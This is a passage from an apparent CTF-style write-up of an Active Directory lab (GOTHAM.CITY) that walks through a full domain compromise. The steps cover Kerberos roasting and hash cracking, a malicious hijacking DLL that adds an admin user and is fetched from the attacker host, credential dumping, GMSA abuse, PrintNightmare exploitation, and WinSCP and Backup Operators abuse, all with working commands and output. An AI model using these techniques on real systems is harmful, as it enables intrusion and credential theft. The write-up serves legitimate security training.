SMB         192.168.56.10   445    DC01             1122: GOTHAM\talia.al.ghul (SidTypeUser)
SMB         192.168.56.10   445    DC01             1123: GOTHAM\rachel.dawes (SidTypeUser)
SMB         192.168.56.10   445    DC01             1124: GOTHAM\ras.al.ghul (SidTypeUser)
SMB         192.168.56.10   445    DC01             1125: GOTHAM\scarecrow (SidTypeUser)
SMB         192.168.56.10   445    DC01             1126: GOTHAM\poison.ivy (SidTypeUser)
SMB         192.168.56.10   445    DC01             1127: GOTHAM\black.mask (SidTypeUser)
SMB         192.168.56.10   445    DC01             1128: GOTHAM\killer.croc (SidTypeUser)
SMB         192.168.56.10   445    DC01             1129: GOTHAM\deadshot (SidTypeUser)
SMB         192.168.56.10   445    DC01             1130: GOTHAM\gmsa-robin$ (SidTypeUser)
```

We can validate that they are real users:

```shell
exegol@workspace$ kerbrute userenum -d 'GOTHAM.CITY' --dc 192.168.56.10 users

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 08/10/25 - Ronnie Flathers @ropnop

2025/08/10 15:09:25 >  Using KDC(s):
2025/08/10 15:09:25 >  	192.168.56.10:88

2025/08/10 15:09:25 >  [+] VALID USERNAME:	 SRV01$@GOTHAM.CITY
2025/08/10 15:09:25 >  [+] VALID USERNAME:	 bruce.wayne@GOTHAM.CITY
2025/08/10 15:09:25 >  [+] VALID USERNAME:	 Administrator@GOTHAM.CITY
2025/08/10 15:09:25 >  [+] VALID USERNAME:	 SRV02$@GOTHAM.CITY
2025/08/10 15:09:25 >  [+] VALID USERNAME:	 DC01$@GOTHAM.CITY
2025/08/10 15:09:25 >  [+] VALID USERNAME:	 Guest@GOTHAM.CITY
2025/08/10 15:09:25 >  [+] VALID USERNAME:	 alfred.pennyworth@GOTHAM.CITY
2025/08/10 15:09:25 >  [+] VALID USERNAME:	 harvey.dent@GOTHAM.CITY
2025/08/10 15:09:25 >  [+] VALID USERNAME:	 selina.kyle@GOTHAM.CITY
2025/08/10 15:09:25 >  [+] VALID USERNAME:	 joker@GOTHAM.CITY
2025/08/10 15:09:25 >  [+] VALID USERNAME:	 jim.gordon@GOTHAM.CITY
2025/08/10 15:09:25 >  [+] VALID USERNAME:	 barbara.gordon@GOTHAM.CITY
2025/08/10 15:09:25 >  [+] VALID USERNAME:	 oswald.cobblepot@GOTHAM.CITY
2025/08/10 15:09:25 >  [+] VALID USERNAME:	 edward.nygma@GOTHAM.CITY
2025/08/10 15:09:25 >  [+] VALID USERNAME:	 lucius.fox1337@GOTHAM.CITY
2025/08/10 15:09:25 >  [+] VALID USERNAME:	 victor.freeze@GOTHAM.CITY
2025/08/10 15:09:25 >  [+] VALID USERNAME:	 harley.quinn@GOTHAM.CITY
2025/08/10 15:09:25 >  [+] VALID USERNAME:	 bane@GOTHAM.CITY
2025/08/10 15:09:25 >  [+] VALID USERNAME:	 dick.grayson@GOTHAM.CITY
2025/08/10 15:09:25 >  [+] VALID USERNAME:	 jason.todd@GOTHAM.CITY
2025/08/10 15:09:25 >  [+] VALID USERNAME:	 tim.drake@GOTHAM.CITY
2025/08/10 15:09:25 >  [+] VALID USERNAME:	 talia.al.ghul@GOTHAM.CITY
2025/08/10 15:09:25 >  [+] VALID USERNAME:	 ras.al.ghul@GOTHAM.CITY
2025/08/10 15:09:25 >  [+] VALID USERNAME:	 rachel.dawes@GOTHAM.CITY
2025/08/10 15:09:25 >  [+] VALID USERNAME:	 scarecrow@GOTHAM.CITY
2025/08/10 15:09:25 >  [+] VALID USERNAME:	 black.mask@GOTHAM.CITY
2025/08/10 15:09:25 >  [+] VALID USERNAME:	 poison.ivy@GOTHAM.CITY
2025/08/10 15:09:25 >  [+] VALID USERNAME:	 killer.croc@GOTHAM.CITY
2025/08/10 15:09:25 >  [+] VALID USERNAME:	 deadshot@GOTHAM.CITY
2025/08/10 15:09:25 >  [+] VALID USERNAME:	 gmsa-robin$@GOTHAM.CITY
```

This provides a massive list of users for possible password spraying (username:username was attempted without success).

### AS-REP Roasting

Checking if any accounts are vulnerable to AS-REP roasting, which can yield hashes without needing to crack passwords.

**Command used:**
```bash
exegol@workspace$ nxc ldap 192.168.56.10 -u ../../users -p '' --asreproast asrep.out
LDAP        192.168.56.10   389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:GOTHAM.CITY)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
LDAP        192.168.56.10   389    DC01             $krb5asrep$23$lucius.fox1337@GOTHAM.CITY:d9c404566afbe1d2286981677fc80698$6c537f49172a7fa52228b39feaa0bdb262b60b4c34e50bb2e437d3c42348127c247b3aeb4c0d2be73559030304378247855460f15704a67237f01402146195090ba77c4a0f4e98d071c77f7e219634c4562cd6083e47b29cee8277f0a226fa28bae2d8545f310dd1098207b0ecbcd58d16faadfbc527c6e6ee0e19098a597f99d200d21ad3ab571cf1b8a7609a2420eed0801441c529ab05d26096412cfec26f6ad6d989499cb9e97333dc002d9527aac2c4ab9a9f594e46dd13eacee3c87b1512cb6c6ef79dc90181617c7fc21ea23e148af321cce33e87307456e6a195aa64ee8f07ffcbede662c856
```

**Vulnerable account found:** `lucius.fox1337`

Good news, though the hash didn't crack after 15 minutes of Hashcat. However, through an AS-REP roastable account, Kerberoasting becomes possible via a different path:

[NetExec - Kerberoasting via AS-REP Roasting](https://www.netexec.wiki/ldap-protocol/kerberoasting#kerberoasting-via-as-rep-roasting)

### Kerberoasting

Using the AS-REP vulnerable account to request Kerberos tickets and potentially get more hashes.

**Command used:**
```bash
exegol@workspace$ nxc ldap 192.168.56.10 -u lucius.fox1337  -p '' --no-preauth-targets users --kerberoasting output.txt
LDAP        192.168.56.10   389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:GOTHAM.CITY) (signing:None) (channel binding:No TLS cert) 
LDAP        192.168.56.10   389    DC01             [+] GOTHAM.CITY\lucius.fox1337 account vulnerable to asreproast attack 
LDAP        192.168.56.10   389    DC01             [*] Skipping account: krbtgt, DC01$, SRV02$, SRV01$, gmsa-robin$
LDAP        192.168.56.10   389    DC01             [*] Total of records returned 1
LDAP        192.168.56.10   389    DC01             $krb5tgs$23$*joker$GOTHAM.CITY$joker*$3fd3e317bcab4d20ef85bb713a18c8ae$5cfb68418ecc8da001f33f20104d453c5f7e37f1bd5d4bbee6e0990664803fe209940f1303bae56dfca45eb7ecd2457f2932510683e2baf0558431abd9068fc821cc407119436f53d12e99fab68d43d4fcce94774678555976f0ea7f818f045243f70eb608ae2ff25c746aa7125287175ae1a0728b456f734245ddf04faa3ebe08cee64c22c9a607672caebc8ef0ae43d45f4de9935ef6b591c92480e3db2f77e8c23ba4cb1d37cc17aea5793ae8541d935ebd5a864ecb704051b6a83ec1dfff4a28a72b00d0fb6a117f8ca016374295fdf4be0ccd0e15b273f814d3cfde6442cd3370c7d2b2e5f795c73406439e9d6a4c42e1d9995b47595843e09624f934cd50f27c5f7769e3a73e3d0d63a1988f3521e77777d7023731ca982901c92a8525c33727051bde3ebb13e98e2682d4aea10acca3c678f86ecc860b2acfca4c69f2009b27ed75cd74f5743837b8130ce986b702ec33208b5fe1152635a51924842677a808ca8ba9917d6aa310392cbd387fb9c80c536d4ca2aa16b84b7a564f6df444ee8693e76a6c19ce3f46c0f19ee673edce377afc12a1bac7237f52f36e3f2e7f2726d5dbfb870e01180942b888118843a25513707de557ddcaf93cce7cedbc46411e8a5229a7c9d2512ced38f58bb0ec1fc5d72ae53652b757f83321fbb3d18d4370a1519eadfb051e200b1257b5e0a721a27cb4dd65258caa9bf8fbb06ed6b304169e61987c98b19f10e06f4f7f1ff4ef2c976e186d2209c555f0674bf2e2cec55e200a65ab7ceaf62a7148c086ad05fe8245710bc09018082d46b7d6438235fde0403f5e854b8f228bb8016be0101e7db373a22e64e820a48e41394a4a6794165ffc207514ec1e83c318dd6a63afc5d0cbe7bf89dba02928002ee0e5cd942dc69f84249e358a1b20aad835aa3af582f1831a03f2c32ca6eb8a0291c3e129fd213b9fa2874b1c2dd4747abdb5d9db4bb20b70f2e5ceca5c690152285eac99093fa3f778cbb2a7504958e41a786e7ca13104481bbec342fe8d34800cc2978854fb93b4410a6c070326e9d6bf7cf26302f154dc74c6c416c8a69ffe2337531f9ead230c386274e5500f7aa38b8154fe88397c10c180ecb22d527aafd83d46689ac2f1155cd359f6011ddd5fdec4c20ceb51517585069001fce023727781ae48e68d0631af39d30364ca245a277be581f207e72514852dfb4386768e92864daea63a4433ff462dc5eeb799181afb786f897603dee9113998ef0ca93a16d6b176ba43dd8fff3dc59f7d6a093aeaf530dcccb96fb86b81a0e45434ab722fbc9d247b939f6c44d47bf5f5457659be1d1375099a
```

**Hash obtained:** TGS hash for the `joker` account

```shell
exegol@workspace$ john --wordlist=/usr/share/wordlists/rockyou.txt jokertgs.hash        
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS-REP etype 23 [MD4 HMAC-MD5 RC4])
Will run 22 OpenMP threads
Press 'q' or Ctrl-C to abort, 'h' for help, almost any other key for status
<3batman0893     (?)     
1g 0:00:00:06 DONE (2025-08-10 15:51) 0.1499g/s 1723Kp/s 1723Kc/s 1723KC/s @4208891ncv..;iiI4k
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

**Password cracked:** `<3batman0893`

Excellent! We now have valid credentials for a domain user. This opens up many possibilities for lateral movement.

---

## Phase 2: SRV01 Exploitation

### Administrative Access via RDP

With joker's credentials, testing for administrative access to SRV01.

**Command used:**
```bash
nxc rdp 192.168.56.0/24 -u joker -p '<3batman0893'
```

**Result:** Administrative access to SRV01!

### Wayne Service Discovery

Once on SRV01, exploring the system reveals some suspicious Batman-related artifacts.

**Directory contents:**
```
PS C:\> ls


    Directory: C:\


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         8/10/2025   6:52 AM                CleanSlate
d-----          5/8/2021   1:20 AM                PerfLogs
d-r---         8/10/2025   5:05 AM                Program Files
d-----         8/10/2025   5:18 AM                Program Files (x86)
d-----         8/10/2025   4:54 AM                tmp
d-r---         8/10/2025   7:28 AM                Users
d-----         8/10/2025   5:20 AM                Wayne
d-----         8/10/2025   5:18 AM                Windows
-a----         8/10/2025   5:15 AM            660 dns_log.txt
```

Digging deeper:

```shell
PS C:\Wayne> dir


    Directory: C:\Wayne


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         8/10/2025   5:20 AM         115712 wayne.exe
```

Another executable to investigate, but moving on to more interesting findings.

**Permission analysis reveals:**
```
PS C:\Wayne> icacls.exe .\wayne.exe
.\wayne.exe NT AUTHORITY\SYSTEM:(I)(F)
            BUILTIN\Administrators:(I)(F)
            BUILTIN\Users:(I)(RX)

Successfully processed 1 files; Failed processing 0 files
PS C:\Wayne> cd ..
PS C:\> icacls.exe .\Wayne\
.\Wayne\ NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
         BUILTIN\Administrators:(I)(OI)(CI)(F)
         BUILTIN\Users:(I)(OI)(CI)(RX)
         BUILTIN\Users:(I)(CI)(AD)
         BUILTIN\Users:(I)(CI)(WD)
         CREATOR OWNER:(I)(OI)(CI)(IO)(F)

Successfully processed 1 files; Failed processing 0 files
PS C:\> .\Wayne\wayne.exe
LoadLibrary() KO - Error: 126
```

The BUILTIN\Users group has data write (WD) and data append (AD) permissions on this folder, which apply to its child objects (CI).

The AD and WD permissions are the most important here. They allow you to create new files and modify the content of existing files inside the C:\Wayne directory.

The LoadLibrary() KO Error - Error: 126:

This error occurs when the wayne.exe program attempts to load a DLL at runtime and fails to find it. Error 126 is specifically ERROR_MOD_NOT_FOUND.

The program is looking for a required DLL, but due to a misconfiguration or a missing dependency, it cannot find it in its standard search path.

### DLL Hijacking Exploitation

The `wayne.exe` service tries to load `alfred.dll` which doesn't exist. This is perfect for DLL hijacking.

**Malicious DLL code:**
```c
#include <windows.h>
#include <stdlib.h>

BOOL APIENTRY DllMain( HANDLE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved ) {
    switch (ul_reason_for_call) {
        case DLL_PROCESS_ATTACH:
            system("net user elliotbelt elliot123 /add");
            system("net localgroup administrators elliotbelt /add");
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE;
}
```

**Compilation and deployment:**
```bash
x86_64-w64-mingw32-gcc alfred.dll.c --shared -o alfred.dll
```

**Transfer and execution:**
```bash
Invoke-WebRequest http://192.168.56.1:8081/alfred.dll -OutFile alfred.dll
net start WayneService
```

**Result:** Successfully created the `elliotbelt` account with administrator privileges:
```shell
PS C:\Wayne> net user

User accounts for \\SRV01

-------------------------------------------------------------------------------
Administrator            DefaultAccount           elliotbelt
Guest                    vagrant                  WDAGUtilityAccount
```

### SAM and LSA Hash Dump

With administrator access, extracting the local credentials to see what else can be discovered.

**Command used:**
```bash
exegol@workspace$ nxc smb 192.168.56.11 -u elliotbelt -p 'elliot123' --local-auth --lsa --sam
SMB         192.168.56.11   445    SRV01            [*] Windows Server 2022 Build 20348 x64 (name:SRV01) (domain:SRV01) (signing:False) (SMBv1:False)
SMB         192.168.56.11   445    SRV01            [+] SRV01\elliotbelt:elliot123 (admin)
SMB         192.168.56.11   445    SRV01            [*] Dumping SAM hashes
SMB         192.168.56.11   445    SRV01            Administrator:500:aad3b435b51404eeaad3b435b51404ee:f659535a42adfdbc297197e20073cf0b:::
SMB         192.168.56.11   445    SRV01            Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         192.168.56.11   445    SRV01            DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         192.168.56.11   445    SRV01            WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:7d0577e3707a5387a2e5cead4ff999d8:::
SMB         192.168.56.11   445    SRV01            vagrant:1000:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b:::
SMB         192.168.56.11   445    SRV01            elliotbelt:1001:aad3b435b51404eeaad3b435b51404ee:f17fff84753682b1a3147da512354f3e:::
SMB         192.168.56.11   445    SRV01            [+] Added 6 SAM hashes to the database
SMB         192.168.56.11   445    SRV01            [+] Dumping LSA secrets
SMB         192.168.56.11   445    SRV01            GOTHAM.CITY/Administrator:$DCC2$10240#Administrator#39485ed3512c727dd30b8f5dccd81131: (2025-08-10 12:26:58)
SMB         192.168.56.11   445    SRV01            GOTHAM.CITY/joker:$DCC2$10240#joker#e7d14d706a6a8a40939f0b5ed6fa4db1: (2025-08-10 14:28:32)
SMB         192.168.56.11   445    SRV01            GOTHAM\SRV01$:aes256-cts-hmac-sha1-96:63fa2539564b735b5e1f6bc33ca7a22b73a7fe6c37b9f392d0a60825b64d38cd
SMB         192.168.56.11   445    SRV01            GOTHAM\SRV01$:aes128-cts-hmac-sha1-96:68ded1c5a57f3d336e1fb16f07d3f2da
SMB         192.168.56.11   445    SRV01            GOTHAM\SRV01$:des-cbc-md5:c1ce1c2ae96e91b9
SMB         192.168.56.11   445    SRV01            GOTHAM\SRV01$:plain_password_hex:6e0054005600670022007600320059005200710066003f0051003f004a0031003600350077003500760037003900680050005500610069004d007100230023002d0038004f0029007000280077007a00570036007800300028005f00640049002d00300050007a00550042006b0069005f006f003e0034004b007300670077002a004d0073005f006d003c004A00540033007400300032006a00750044002c004800310033002800580039002c0069003c0077002300450072007400570022005000750052004B0026006c0056006100480051006a003c003f0067007200390036006000470055005900540069006000
SMB         192.168.56.11   445    SRV01            GOTHAM\SRV01$:aad3b435b51404eeaad3b435b51404ee:a6af484f4f8d4e91a635cce086126a8a:::
SMB         192.168.56.11   445    SRV01            dpapi_machinekey:0x536398c499c86f21fd8a2b2e0ff63a53063e2002
dpapi_userkey:0x0d2a0df27786e41a16dc5846f625dbf93be5444c
SMB         192.168.56.11   445    SRV01            _SC_GMSA_DPAPI_{C6810348-4834-4a1e-817D-5838604E6004}_850d620d73382edad7f95ccbd5b3ca0a61ccd5fc95fc82d2e5bf783029da060c:102bca83c7311fdefeb1663b0b3f870be523d4b2cb11e7118fbf301ffb93de0366982e4f0c6b59144265a740cac89bdb46ab34da5a7c8aec84567baf2a19d6ebcc54d0504e88c336cc9f50a9bd7279076177250537eb804104b96a16f90556d4fe37b343d97da514d91a3613ff5fbfa43d288d11a8d79a8f20d8b31ab31f7e20b7235e4ee0de8877777cac7929bf389da60773d32d52092d8fdd82a0b2424b21b2c0450508fe7e43c455948a65aa32e54bb56ce0b843c4fe7865457efa412b1d62273564db64a520882ef6dc03a849d9f43ddaf0fae5aa69ffbb1975e3576c07aa39c1586c010a7e7bbaf0ba37313abf
SMB         192.168.56.11   445    SRV01            _SC_GMSA_{84A78B8C-56EE-465b-8496-FFB35A1B52A7}_850d620d73382edad7f95ccbd5b3ca0a61ccd5fc95fc82d2e5bf783029da060c:01000000220100001000000012011a01aa231bad903452b7199f4e1ae1ae59e57d7389e7a9095501eec4053172fb0efd2281c15f9d83c1894b254eb959a1d2d24bd5a88c88c298893497f1ecd5cca6e36060c5de8ce8acbf4b04ae298dc3fe48b77a8ba5b9590ec41c3573a20ec2ecaa3b85fa3ba68d348cb1a112036a53f58e0bbbc11c30f2feee5fd168ab3d904f0efc1b1a64f2c7f32cb160af5d5286b9801eee3c2d4c77d79c2e86853bd800a147aa695a51a360a3306fabdb19f49a3c527aa47c005bcd9ece9cb634efb51b3e7b0e2688a881d4212005329dffe8a5ab020ad39a41fc4d2d6a159af3ddc4927d31ba9546f1860c849e8483ae12ddc2b77d1687db532735be6c54187ef9ee94658f0000fe1dfef84c170000febf2d464c170000
SMB         192.168.56.11   445    SRV01            GMSA ID: 850d620d73382edad7f95ccbd5b3ca0a61ccd5fc95fc82d2e5bf783029da060c NTLM: 76679bd649f3801655ba01794de14e0b
SMB         192.168.56.11   445    SRV01            [+] Dumped 10 LSA secrets to /root/.nxc/logs/lsa/192.168.56.11_None_2025-08-10_182409.secrets and /root/.nxc/logs/lsa/192.168.56.11_None_2025-08-10_182409.cached
```

Nothing very interesting for pivoting besides `_SC_GMSA_DPAPI_`. After some research on GMSA (Group Managed Service Accounts):

- [The Hacker Recipes - ReadGMSAPassword](https://www.thehacker.recipes/ad/movement/dacl/readgmsapassword)
- [NetExec - Extract GMSA Secrets](https://www.netexec.wiki/ldap-protocol/extract-gmsa-secrets)

A GMSA is a Group Managed Service Account used to run services without needing to manage a password.
So, we have the NTLM hash for this account: 76679bd649f3801655ba01794de14e0b \
Taking the account ID: 850d620d73382edad7f95ccbd5b3ca0a61ccd5fc95fc82d2e5bf783029da060c

Since the elliot account is a local machine account and not a domain account, the joker account, which is joined to the domain, is needed for the next steps.

```shell
exegol@workspace$ nxc ldap 192.168.56.10 -u joker -p '<3batman0893' --gmsa-convert-id 850d620d73382edad7f95ccbd5b3ca0a61ccd5fc95fc82d2e5bf783029da060c    
LDAP        192.168.56.10   389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:GOTHAM.CITY) (signing:None) (channel binding:No TLS cert) 
LDAP        192.168.56.10   389    DC01             [+] GOTHAM.CITY\joker:<3batman0893 
LDAP        192.168.56.10   389    DC01             Account: gmsa-robin$          ID: 850d620d73382edad7f95ccbd5b3ca0a61ccd5fc95fc82d2e5bf783029da060c
```
New user discovered: `gmsa-robin$`

### GMSA Robin Exploitation

**Discovery:** The GMSA has `GenericAll` rights on `harley.quinn` (via bloodhound)

This is a powerful finding! `GenericAll` means we can modify any attribute of the target user, including their password.

### Password Change

Exploiting these rights to change harley.quinn's password to a known value.

**Command used:**

```shell
exegol@workspace$ changepasswd.py -reset -altuser 'gmsa-robin$' -althash '76679bd649f3801655ba01794de14e0b' -newpass 'elliot123' GOTHAM.CITY/'harley.quinn'@DC01.GOTHAM.CITY
Impacket v0.13.0.dev0+20250107.155526.3d734075 - Copyright Fortra, LLC and its affiliated companies 

[*] Setting the password of GOTHAM.CITY\harley.quinn as GOTHAM.CITY\gmsa-robin$
[*] Connecting to DCE/RPC as GOTHAM.CITY\gmsa-robin$
[*] Password was changed successfully.
[!] User no longer has valid AES keys for Kerberos, until they change their password again.
```

**Result:** Password successfully changed to `elliot123`

Another domain account is now accessible with potentially different privileges. Time to see where this leads.

---

## Phase 3: Pivot to SRV02

### RDP Access to SRV02

With harley.quinn's new credentials, testing access to SRV02.

**Command used:**
```shell
exegol@workspace$ nxc rdp 192.168.56.12 -u harley.quinn -p elliot123
RDP         192.168.56.12   3389   SRV02            [*] Windows 10 or Windows Server 2016 Build 20348 (name:SRV02) (domain:GOTHAM.CITY) (nla:True)
RDP         192.168.56.12   3389   SRV02            [+] GOTHAM.CITY\harley.quinn:elliot123 (admin)
```

**Result:** Administrative access to SRV02! We're making good progress through the domain.

### PrintNightmare Vulnerability Discovery

After consulting an enumeration checklist, the server appears vulnerable to PrintNightmare, which could provide another path to privilege escalation.

Naturally, NetExec has a module for that.


**Command used:**
```shell
exegol@workspace$ nxc smb 192.168.56.12 -u harley.quinn -p elliot123 -M spooler
SMB         192.168.56.12   445    SRV02            [*] Windows Server 2022 Build 20348 x64 (name:SRV02) (domain:GOTHAM.CITY) (signing:False) (SMBv1:False)
SMB         192.168.56.12   445    SRV02            [+] GOTHAM.CITY\harley.quinn:elliot123 
SPOOLER     192.168.56.12   445    SRV02            Spooler service enabled

exegol@workspace$ nxc smb -L
LOW PRIVILEGE MODULES
...
[*] printnightmare            Check if host vulnerable to printnightmare
...

exegol@workspace$ nxc smb 192.168.56.12 -u harley.quinn -p elliot123 -M printnightmare       
SMB         192.168.56.12   445    SRV02            [*] Windows Server 2022 Build 20348 x64 (name:SRV02) (domain:GOTHAM.CITY) (signing:False) (SMBv1:False)
SMB         192.168.56.12   445    SRV02            [+] GOTHAM.CITY\harley.quinn:elliot123 
PRINTNIG... 192.168.56.12   445    SRV02            Vulnerable, next step https://github.com/ly4k/PrintNightmare
```


**Result:** Vulnerable!

**Remote exploitation attempt failed:**
```shell
 exegol@workspace$ python3 printnight2.py -u harley.quinn -p elliot123 -d GOTHAM.CITY -dll print.dll 192.168.56.10
[*] starting PrintNightmare PoC
[+] Self-hosted payload at \\192.168.1.169\DjkfDF\print.dll

[*] Attempting target: 192.168.56.10
[*] Connecting to ncacn_np:192.168.56.10[\PIPE\spoolss]
[+] Bind OK
[+] pDriverPath Found C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_075615bee6f80a8d\Amd64\UNIDRV.DLL
[*] Executing \??\UNC\192.168.1.169\DjkfDF\print.dll
[*] Try 1...
[-] Exploit returned: RPRN SessionError: unknown error code: 0x8001011b
[*] Closing SMB Server
```

**Error:** `RPRN SessionError: unknown error code: 0x8001011b`

The `0x8001011b` error indicates the remote exploitation path is blocked.

Since Microsoft patched the PrintNightmare vulnerability, the remote execution of printer drivers via the Spooler service has been hardened. Operating systems have been patched to block attempts to load unsigned DLLs from remote UNC paths. The Spooler service on the domain controller (192.168.56.10) intercepts this request, detects that it is potentially dangerous (because it doesn't come from a local path and is not signed), and rejects it with this specific RPC error code.

### Local PrintNightmare Exploitation

Since RDP access is available, a local PowerShell exploit for CVE-2021-34527 can be used ([JohnHammond/CVE-2021-34527](https://github.com/JohnHammond/CVE-2021-34527)).

**PowerShell commands:**
```powershell
PS C:\Users\harley.quinn\Desktop> Import-Module .\CVE-2021-34527.ps1
PS C:\Users\harley.quinn\Desktop> Invoke-Nightmare
[+] using default new user: adm1n
[+] using default new password: P@ssw0rd
[+] created payload at C:\Users\harley.quinn\AppData\Local\Temp\2\nightmare.dll
[+] using pDriverPath = "C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_075615bee6f80a8d\Amd64\mxdwdrv.dll"
[+] added user  as local administrator
[+] deleting payload from C:\Users\harley.quinn\AppData\Local\Temp\2\nightmare.dll
PS C:\Users\harley.quinn\Desktop>
```

**Result:** Successfully created the `adm1n` account with local administrator privileges!

```shell
exegol@workspace$ nxc smb 192.168.56.0/24 -u adm1n -p P@ssw0rd --local-auth
SMB         192.168.56.12   445    SRV02            [*] Windows Server 2022 Build 20348 x64 (name:SRV02) (domain:SRV02) (signing:False) (SMBv1:False)
SMB         192.168.56.10   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:DC01) (signing:True) (SMBv1:False) (Null Auth:True)
SMB         192.168.56.11   445    SRV01            [*] Windows Server 2022 Build 20348 x64 (name:SRV01) (domain:SRV01) (signing:False) (SMBv1:False)
SMB         192.168.56.12   445    SRV02            [+] SRV02\adm1n:P@ssw0rd (admin)
```

### WinSCP Credentials Discovery

After some exploration, an interesting file appears in the root directory:
```powershell
PS C:\Users\harley.quinn\Desktop> cd ../../../
PS C:\> dir


    Directory: C:\


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          5/8/2021   1:20 AM                PerfLogs
d-r---         8/10/2025   5:05 AM                Program Files
d-----         8/10/2025   5:18 AM                Program Files (x86)
d-----         8/10/2025   4:56 AM                tmp
d-r---         8/10/2025  10:15 AM                Users
d-----         8/10/2025   5:18 AM                Windows
-a----         8/10/2025   5:15 AM            660 dns_log.txt
-a----         8/10/2025   5:20 AM           1118 winscp.reg
```
The `.reg` file seems suspicious. After a quick search, it turns out NetExec has a [dedicated module for dumping WinSCP credentials](https://www.netexec.wiki/smb-protocol/obtaining-credentials/dump-winscp).


**Command used:**
```bash
exegol@workspace$ nxc smb 192.168.56.12 -u adm1n -p P@ssw0rd --local-auth -M winscp  
SMB         192.168.56.12   445    SRV02            [*] Windows Server 2022 Build 20348 x64 (name:SRV02) (domain:SRV02) (signing:False) (SMBv1:False)
SMB         192.168.56.12   445    SRV02            [+] SRV02\adm1n:P@ssw0rd (admin)
WINSCP      192.168.56.12   445    SRV02            [*] Looking for WinSCP creds in Registry...
WINSCP      192.168.56.12   445    SRV02            [+] Found 1 sessions for user "vagrant" in registry!
WINSCP      192.168.56.12   445    SRV02            =======harvey.dent@coin.gotham.city=======
WINSCP      192.168.56.12   445    SRV02            HostName: coin.gotham.city
WINSCP      192.168.56.12   445    SRV02            UserName: harvey.dent
WINSCP      192.168.56.12   445    SRV02            Password: X76IAZS!j'Czu,
WINSCP      192.168.56.12   445    SRV02            [*] Looking for WinSCP creds in User documents and AppData...
```

**Credentials recovered:**
- **User:** `harvey.dent`
- **Password:** `X76IAZS!j'Czu,`

This is another valuable credential set. Checking what rights this user has on the domain.

### Backup Operators Rights Verification

In BloodHound, this user has `GenericAll` on the Backup Operators group.

This means a controlled user can be added to this group to save all the hives, dump passwords, and pivot.

**Command used:**
```bash
exegol@workspace$ bloodyAD --dc-ip 192.168.56.10 -d GOTHAM.CITY -u harvey.dent -p "X76IAZS\!j'Czu,"  add groupMember "backup operators" "elliotbelt"
Traceback (most recent call last):
  File "/root/.local/bin/bloodyAD", line 8, in <module>
    sys.exit(main())
             ^^^^^^
  File "/root/.local/share/pipx/venvs/bloodyad/lib/python3.11/site-packages/bloodyAD/main.py", line 210, in main
    output = args.func(conn, **params)
             ^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/root/.local/share/pipx/venvs/bloodyad/lib/python3.11/site-packages/bloodyAD/cli_modules/add.py", line 247, in groupMember
    member_transformed = conn.ldap.dnResolver(member)
                         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/root/.local/share/pipx/venvs/bloodyad/lib/python3.11/site-packages/bloodyAD/network/ldap.py", line 281, in dnResolver
    ).result()
      ^^^^^^^^
  File "/root/.pyenv/versions/3.11.11/lib/python3.11/concurrent/futures/_base.py", line 456, in result
    return self.__get_result()
           ^^^^^^^^^^^^^^^^^^^
  File "/root/.pyenv/versions/3.11.11/lib/python3.11/concurrent/futures/_base.py", line 401, in __get_result
    raise self._exception
  File "/root/.local/share/pipx/venvs/bloodyad/lib/python3.11/site-packages/bloodyAD/network/ldap.py", line 275, in asyncDnResolver
    raise NoResultError(self.domainNC, ldap_filter)
bloodyAD.exceptions.NoResultError: [-] No object found in DC=GOTHAM,DC=CITY with filter: (sAMAccountName=elliotbelt)
exegol@workspace$ bloodyAD --dc-ip 192.168.56.10 -d GOTHAM.CITY -u harvey.dent -p "X76IAZS\!j'Czu,"  add groupMember "backup operators" "harvey.dent"
[+] harvey.dent added to backup operators
```

The first attempt failed because the `elliotbelt` account was a local user and not domain-joined. The second attempt with `harvey.dent` succeeded.

**Result:** Successfully added harvey.dent to the backup operators group!

This is a game-changer. Backup operators have the ability to access and backup sensitive system files, including the SAM, SYSTEM, and SECURITY hives.

---

## Phase 4: Domain Domination

### Backup Operators Rights Exploitation

Using the backup operator privileges to dump the system registries and potentially the NTDS database.

**Command used:**
```shell
exegol@workspace$ nxc smb 192.168.56.10 -u harvey.dent -p 'X76IAZS!j'\''Czu,' -M backup_operator 
SMB         192.168.56.10   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:GOTHAM.CITY) (signing:True) (SMBv1:False) (Null Auth:True)
SMB         192.168.56.10   445    DC01             [+] GOTHAM.CITY\harvey.dent:X76IAZS!j'Czu, 
BACKUP_O... 192.168.56.10   445    DC01             [*] Triggering RemoteRegistry to start through named pipe...
